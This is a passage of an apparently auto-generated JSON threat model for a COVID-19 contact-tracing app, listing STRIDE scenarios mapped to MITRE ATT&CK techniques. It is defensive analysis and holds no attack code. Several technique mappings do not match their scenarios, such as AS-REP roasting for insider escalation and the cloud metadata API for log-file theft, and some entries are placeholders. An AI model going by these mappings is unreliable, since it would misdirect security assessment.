        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs Bluetooth signals to appear as multiple devices, generating false proximity alerts in a decentralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication protocols are not verified by the application.",
                    "Role": "Application",
                    "Condition": "Lack of robust signal verification mechanisms"
                },
                {
                    "Assumption": "Attacker has physical proximity to targeted users.",
                    "Role": "Attacker",
                    "Condition": "Physical presence within Bluetooth range"
                },
                {
                    "Assumption": "Users rely on proximity alerts to make health-related decisions.",
                    "Role": "User",
                    "Condition": "Trust in application notifications"
                }
            ],
            "Potential Impact": "Data integrity degradation and potential health risk due to false exposure alerts.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "bluetooth",
                "proximity falsification",
                "device"
            ],
            "mitre_technique": {
                "name": "Peripheral Device Discovery",
                "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
                "id": "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643",
                "technique_id": "T1120"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts the registration process to impersonate a user in a centralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Communication between the central server and the application is not adequately encrypted.",
                    "Role": "Application",
                    "Condition": "Weak encryption or no encryption"
                },
                {
                    "Assumption": "Attacker has the ability to intercept and modify network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access or proximity"
                },
                {
                    "Assumption": "User trusts the application without secondary verification for initial registration.",
                    "Role": "User",
                    "Condition": "Lack of multi-factor authentication"
                }
            ],
            "Potential Impact": "Unauthorized access to the user's personal and health data, potentially leading to identity theft.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "registration interception",
                "network",
                "central server"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the exchanged temporary IDs between devices in centralized architecture to create false positive COVID-19 alerts.",
            "Assumptions": [
                {
                    "Assumption": "Temporary IDs are not protected by integrity checks.",
                    "Role": "Application",
                    "Condition": "Lack of integrity validation mechanisms"
                },
                {
                    "Assumption": "Attacker has access to device or is within proximity to intercept transmissions.",
                    "Role": "Attacker",
                    "Condition": "Physical or proximity access"
                },
                {
                    "Assumption": "Users depend on the application for health status updates.",
                    "Role": "User",
                    "Condition": "High trust in application"
                }
            ],
            "Potential Impact": "False positive alerts, leading to unnecessary panic and misuse of healthcare resources.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data modification",
                "false positives",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware on user devices modifies the log files to prevent accurate tracing of contacts.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack malware protection tools.",
                    "Role": "User",
                    "Condition": "Poor cybersecurity practices"
                },
                {
                    "Assumption": "Log files are stored locally without proper validation before central processing.",
                    "Role": "Application",
                    "Condition": "Lack of log file validation"
                },
                {
                    "Assumption": "Application relies heavily on local storage before uploading data.",
                    "Role": "Application",
                    "Condition": "Local-first data handling approach"
                }
            ],
            "Potential Impact": "Compromised data integrity, resulting in inaccurate contact tracing and failure to control the spread of COVID-19.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "malware",
                "log file modification",
                "user device"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider within the organization modifies data on the central server to hide contact-related information.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate access to the central server.",
                    "Role": "Insider",
                    "Condition": "Authorized access with malicious intent"
                },
                {
                    "Assumption": "No robust access control or monitoring mechanisms in place.",
                    "Role": "Organization",
                    "Condition": "Weak internal security controls"
                },
                {
                    "Assumption": "Central server data is authoritative and unverified by secondary means.",
                    "Role": "Central Server",
                    "Condition": "Centralized data authority without redundancy"
                }
            ],
            "Potential Impact": "Unauthorized alteration of data, leading to underreporting of exposure risk and ineffective contact tracing.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "data modification",
                "central server"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious actors deny responsibility for actions by exploiting the lack of a proper logging mechanism in the decentralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "The application does not have proper logging or user actions are not recorded securely.",
                    "Role": "Application",
                    "Condition": "Insufficient logging mechanisms"
                },
                {
                    "Assumption": "User devices do not verify the origin of commands or actions taken.",
                    "Role": "User Device",
                    "Condition": "Weak verification of actions"
                },
                {
                    "Assumption": "Interactions are not validated by central authority.",
                    "Role": "Application",
                    "Condition": "Decentralized architecture without central verification"
                }
            ],
            "Potential Impact": "Inability to hold malicious actors accountable, leading to potential misuse without consequences.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "action denial",
                "logging deficiencies",
                "decentralized"
            ],
            "mitre_technique": {
                "name": "Multi-hop Proxy",
                "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks \u2013 such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing)\n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.\n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)",
                "id": "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d",
                "technique_id": "T1090.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users claim they did not receive exposure alerts due to insufficient record-keeping of alert logs on the central server.",
            "Assumptions": [
                {
                    "Assumption": "Central server lacks detailed logs of sent notifications.",
                    "Role": "Central Server",
                    "Condition": "Inadequate logging of notifications"
                },
                {
                    "Assumption": "Users' devices do not verify or store received alerts locally.",
                    "Role": "User Device",
                    "Condition": "No local logs of alerts"
                },
                {
                    "Assumption": "Users rely on the application for accurate notification delivery.",
                    "Role": "User",
                    "Condition": "Dependence on application"
                }
            ],
            "Potential Impact": "Disputes over the reliability of the notification system and potential failure to adhere to quarantine guidelines.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "notification logs",
                "central server",
                "dispute"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker claims innocence after altering exposure data on their device due to lack of audit trail.",
            "Assumptions": [
                {
                    "Assumption": "No robust audit trail to track data changes on user devices.",
                    "Role": "Application",
                    "Condition": "Lack of audit logging"
                },
                {
                    "Assumption": "User devices allow modification of stored data without detecting tampering.",
                    "Role": "User Device",
                    "Condition": "Weak security controls on local data"
                },
                {
                    "Assumption": "Application lacks mechanisms to verify data integrity upon syncing with central server.",
                    "Role": "Application",
                    "Condition": "Lack of integrity verification"
                }
            ],
            "Potential Impact": "Difficulty in proving malicious actions, leading to potential misuse and data corruption.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trail",
                "data integrity",
                "user device"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is intercepted during transmission to the central server due to lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between user device and central server is in plaintext.",
                    "Role": "Application",
                    "Condition": "Unencrypted communication"
                },
                {
                    "Assumption": "Attacker has the ability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access or proximity"
                },
                {
                    "Assumption": "Sensitive data is transmitted frequently by the application.",
                    "Role": "Application",
                    "Condition": "Regular transmission of health and personal data"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive health and personal information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network interception",
                "plaintext transmission",
                "central server"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--e49920c7-cf96-42bd-b3ef-38df365c8c90",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to log files that store unencrypted sensitive metadata and timestamps.",
            "Assumptions": [
                {
                    "Assumption": "Log files are not encrypted and contain sensitive metadata.",
                    "Role": "Application",
                    "Condition": "Unencrypted logs"
                },
                {
                    "Assumption": "Attacker gains unauthorized access to user devices or central server storing log files.",
                    "Role": "Attacker",
                    "Condition": "Unauthorized access capabilities"
                },
                {
                    "Assumption": "Log files are comprehensive and stored on both local and central servers.",
                    "Role": "Application",
                    "Condition": "System-wide logging"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive metadata that can be used to reconstruct user activities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "log file access",
                "metadata",
                "timestamp"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A data breach on the central server exposes users' personal contact information and health status.",
            "Assumptions": [
                {
                    "Assumption": "Central server stores sensitive health and contact information in an accessible format.",
                    "Role": "Central Server",
                    "Condition": "Stored sensitive data"
                },
                {
                    "Assumption": "The central server has vulnerabilities that can be exploited.",
                    "Role": "Attacker",
                    "Condition": "Exploitable vulnerabilities"
                },
                {
                    "Assumption": "The central server is a primary target due to the high value of data.",
                    "Role": "Attacker",
                    "Condition": "Highly targeted system"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of users' personal and sensitive health information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data breach",
                "central server",
                "health data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a Distributed Denial of Service (DDoS) attack on the central server, preventing users from registering or updating their status.",
            "Assumptions": [
                {
                    "Assumption": "Central server is critical for application operation and user data processing.",
                    "Role": "Central Server",
                    "Condition": "Centralized architecture"
                },
                {
                    "Assumption": "Server does not have sufficient protective measures against DDoS attacks.",
                    "Role": "Application",
                    "Condition": "Lack of DDoS mitigation"
                },
                {
                    "Assumption": "Attacker has the resources to generate large amounts of traffic.",
                    "Role": "Attacker",
                    "Condition": "Capability to launch DDoS"
                }
            ],
            "Potential Impact": "Disruption of system availability, preventing users from registering or updating their health status.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "ddos",
                "central server",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects user devices, causing the application to crash or become unresponsive, leading to loss of contact tracing capabilities.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack sufficient anti-malware protection.",
                    "Role": "User",
                    "Condition": "Weak endpoint security"
                },
                {
                    "Assumption": "Application has vulnerabilities that can be exploited by malware.",
                    "Role": "Application",
                    "Condition": "Exploitable application vulnerabilities"
                },
                {
                    "Assumption": "Users rely on the application for real-time contact tracing.",
                    "Role": "User",
                    "Condition": "Critical dependence on application"
                }
            ],
            "Potential Impact": "Loss of system availability and loss of contact tracing data during critical periods.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "application crash",
                "user device"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider deliberately overloads the service server in decentralized architecture by uploading large volumes of rolling keys.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate access to the service server.",
                    "Role": "Insider",
                    "Condition": "Authorized access with malicious intent"
                },
                {
                    "Assumption": "Service server is not designed to handle excessive loads from single users.",
                    "Role": "Service Server",
                    "Condition": "Limited load management"
                },
                {
                    "Assumption": "Users rely on the server to download rolling keys for exposure verification.",
                    "Role": "User",
                    "Condition": "Dependence on server for key comparison"
                }
            ],
            "Potential Impact": "Disruption of system availability, preventing exposure verification for all users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "insider threat",
                "service overload",
                "decentralized"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative privileges on user devices by exploiting a zero-day vulnerability, thereby tampering with contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "User device software has unpatched vulnerabilities.",
                    "Role": "User Device",
                    "Condition": "Unpatched zero-day vulnerabilities"
                },
                {
                    "Assumption": "Attacker can deliver payload to exploit vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Capability to exploit zero-day"
                },
                {
                    "Assumption": "Gain of administrative privileges allows modification of application data.",
                    "Role": "Attacker",
                    "Condition": "Elevated privileges enable tampering"
                }
            ],
            "Potential Impact": "Unauthorized modification of data, leading to misinformation and failure in contact tracing accuracy.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day",
                "privilege escalation",
                "user device"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Insider elevates their privileges on the central server to access and alter sensitive health data.",
            "Assumptions": [
                {
                    "Assumption": "Insider has limited access initially but can exploit system weaknesses.",
                    "Role": "Insider",
                    "Condition": "Initial limited access"
                },
                {
                    "Assumption": "Central server lacks proper access control mechanisms.",
                    "Role": "Central Server",
                    "Condition": "Weak access control"
                },
                {
                    "Assumption": "Insider has the technical skills to exploit system vulnerabilities.",
                    "Role": "Insider",
                    "Condition": "Sufficient technical expertise"
                }
            ],
            "Potential Impact": "Unauthorized access and modification of sensitive health data, compromising data integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "privilege escalation",
                "central server"
            ],
            "mitre_technique": {
                "name": "AS-REP Roasting",
                "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
                "id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b",
                "technique_id": "T1558.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious actor uses social engineering techniques to gain higher privileges from a legitimate user account.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to social engineering attacks.",
                    "Role": "User",
                    "Condition": "Low awareness of social engineering tactics"
                },
                {
                    "Assumption": "Application relies on user roles without multi-factor authentication for privilege assignment.",
                    "Role": "Application",
                    "Condition": "Single-factor authentication"
                },
                {
                    "Assumption": "The system grants significant control at higher privilege levels.",
                    "Role": "Application",
                    "Condition": "High control with elevated privileges"
                }
            ],
            "Potential Impact": "Unauthorized elevation of privileges, leading to potential abuse of system functionalities and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "privilege escalation",
                "user account"
            ],
            "mitre_technique": {
                "name": "Bypass User Account Control",
